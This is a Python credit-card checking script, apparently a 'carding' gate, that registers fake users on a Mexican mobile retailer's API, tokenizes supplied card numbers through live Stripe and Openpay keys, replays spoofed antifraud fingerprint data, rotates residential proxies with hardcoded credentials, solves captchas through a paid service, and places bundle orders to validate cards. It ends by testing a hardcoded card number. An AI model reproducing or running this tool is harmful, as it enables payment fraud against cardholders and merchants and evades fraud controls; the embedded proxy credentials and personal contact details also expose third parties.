import ast
import email
from email import message
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c = requests.Session()

            # Definir las credenciales del proxy y la URL
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            # Configurar el proxy con autenticación
            c.proxies = {'https': 'http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334'}#the proxies?http://ubcff417d571a05cf-zone-custom-region-us-st-newyork-city-yonkers-session-OKEZNXIYE-sessTime-5:ubcff417d571a05cf@170.106.118.114:2334
            

            # Desactivar la verificación SSL (equivalente al -k de curl)
            c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'pcu.api.koonolmexico.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'content-type',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }
            

            response = c.options('https://pcu.api.koonolmexico.com/users', headers=headers)

            headers = {
                'authority': 'pcu.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': 'rodrigoking234@gmail.com',
                    'phone': '9971556986',
                    'mobile_phone': '5514696985',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://pcu.api.koonolmexico.com/users', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            id = responsePm['user']['id']
            

            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization,content-type',
                'access-control-request-method': 'GET',
                'cache-control': 'no-cache',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = requests.options('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/antifraudkeys', headers=headers)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                's': 'T4znoUvsRy6AnUYbNGyLnJDBv8qLJ4om',
            }

            response = c.get('https://api.openpay.mx/antifraud/m3mv7moncxdhvlpexzd0/components', params=params, headers=headers)

            headers = {
                'authority': 'm.stripe.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'text/plain;charset=UTF-8',
                # 'cookie': 'm=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5',
                'origin': 'https://m.stripe.network',
                'pragma': 'no-cache',
                'referer': 'https://m.stripe.network/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = 'JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJmYzY2NzBiZDhhYjUzN2RkYjNlMzhlZDUxNjViNDA5NiUyMiUyQyUyMnQlMjIlM0ExNS4xJTJDJTIydGFnJTIyJTNBJTIyJTI0bnBtX3BhY2thZ2VfdmVyc2lvbiUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQW51bGwlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMmh0dHBzJTNBJTJGJTJGYnZCbklBamNhTlpzclBkQTA0NnBRMDM4b3laZTRZcF9iWjVDN0pGWHhqSS4xTmIyS045em1TeXRLazgyc3JTelUzOXZ0MmJwaEtISGF6My1Yc2dneTUwLmcydTktaHFadkdJcVlKY1BsUGZ3SkFmLXYzUmd5S194MU5wcHpBbEExMk0uRmRRcDB0TkR3VGMzN2NjR1JtS0xILXZ3djFsY3Y3aUUzQVRXVXk1XzNLRSUyRjRPV0VkVXV1OEpXNlY4T0tGa0lSSVZpMjdNTTFFNWVUQTlXVWtMMklweFElM0ZTS0dZdFotNXZ6eWVIb3R0akw3cFRMM2VOWWJwZktrMmhnU1FUTnhaUngwJTNEOVBzOUFNZE1xNThqaHlzYm1jS0YxamRzTWVKZ3AydWx4NVpTd0c1VzJKMCUyMiUyQyUyMmIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRmJ2Qm5JQWpjYU5ac3JQZEEwNDZwUTAzOG95WmU0WXBfYlo1QzdKRlh4akkuMU5iMktOOXptU3l0S2s4MnNyU3pVMzl2dDJicGhLSEhhejMtWHNnZ3k1MC5nMnU5LWhxWnZHSXFZSmNQbFBmd0pBZi12M1JneUtfeDFOcHB6QWxBMTJNLkZkUXAwdE5Ed1RjMzdjY0dSbUtMSC12d3YxbGN2N2lFM0FUV1V5NV8zS0UlMkZ4eWJvY2stSEpkNG00eVpMZk8xNWYxQXN3RHlfdzUxQThKM2pEbm1xLXk0JTIyJTJDJTIyYyUyMiUzQSUyMkJzY2daY0lmQ044YjkyemV5ZWpwVmVwMkt0bW9lMW1uMzVyellUUVFKaHclMjIlMkMlMjJkJTIyJTNBJTIyZDU3OTIzYTQtNzFlYS00ZTdlLWJmMWQtOTdiMWM2MTc5OGJkZjYxOGU1JTIyJTJDJTIyZSUyMiUzQSUyMmMyZDRjMTNkLWQzNTMtNDA2OS04MjQ3LTk5MDM4NGI2NWQzZjJlNGQ2YyUyMiUyQyUyMmYlMjIlM0FmYWxzZSUyQyUyMmclMjIlM0F0cnVlJTJDJTIyaCUyMiUzQXRydWUlMkMlMjJpJTIyJTNBJTVCJTIybG9jYXRpb24lMjIlNUQlMkMlMjJqJTIyJTNBJTVCJTVEJTJDJTIybiUyMiUzQTkyLjA5OTk5OTkwNDYzMjU3JTJDJTIydSUyMiUzQSUyMm1pdGllbmRhLm1pbW92aWwuY29tLm14JTIyJTJDJTIydiUyMiUzQSUyMm1pdGllbmRhLm1pbW92aWwuY29tLm14JTIyJTJDJTIydyUyMiUzQSUyMjE3NDM4NzM3Nzc2MTQlM0EyYWFmZDVlNzQ2ODgzMWI4Y2ViNDAyY2I0YTkxM2Q2MWMxNWUyMjg4YjI2ZGU2ZGQ0ZTIxM2QyMzg4ZmFlOThhJTIyJTdEJTJDJTIyaCUyMiUzQSUyMmNmMTJmMmEwNjRiY2RjOTgwMWY1JTIyJTdE'

            response = c.post('https://m.stripe.com/6',  headers=headers, data=data)
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=1068162&pasted_fields=number&guid=2953e2d9-6a1c-4c42-a83e-28bb4e237f8577fee5&muid=d57923a4-71ea-4e7e-bf1d-97b1c61798bdf618e5&sid=c2d4c13d-d353-4069-8247-990384b65d3f2e4d6c&key=pk_live_51PyHMpEQoKLw3xOlGTzEUCu46a5XbGcqmT4Mq9gaNeWitLRHIcJQfg1GMzAR7d9FKuZaZfzRlGPedd7oOYlpbQ2q00rlxlFmOE&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenstr = responsePm['id']
            print(tokenstr)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'authorization,content-type',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = c.options('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/tokens', headers=headers)

            headers = {
                'authority': 'api.openpay.mx',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Basic cGtfNzA1NmQxMjlmZGI2NDUyOTgzYTg3YzBjZmFlMTEyMDY6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'holder_name': name+last,
                'card_number': cc_number,
                'cvv2': cvv,
                'expiration_month': mes,
                'expiration_year': ano_number[-2:],
            }

            response = c.post('https://api.openpay.mx/v1/m3mv7moncxdhvlpexzd0/tokens', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            tokenop = responsePm['id']
            print(tokenop)
            headers = {
                'authority': 'pcu.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': tokenop,
                    'openpay_device_session_id': 'T4znoUvsRy6AnUYbNGyLnJDBv8qLJ4om',
                    'stripe_token': tokenstr,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': id,
            }

            response = c.post('https://pcu.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)

            headers = {
                'authority': 'pcu.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://mitienda.mimovil.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://mitienda.mimovil.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': id,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': False,
                    'payment_plan': None,
                    'nir': None,
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'bundle_id': '24',
                },
                'user_id': id,
            }

            response = c.post('https://pcu.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            print(responsePm)
           
            


            
            print("Status Code:", response.status_code)
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5579100357493400|06|2027|058"))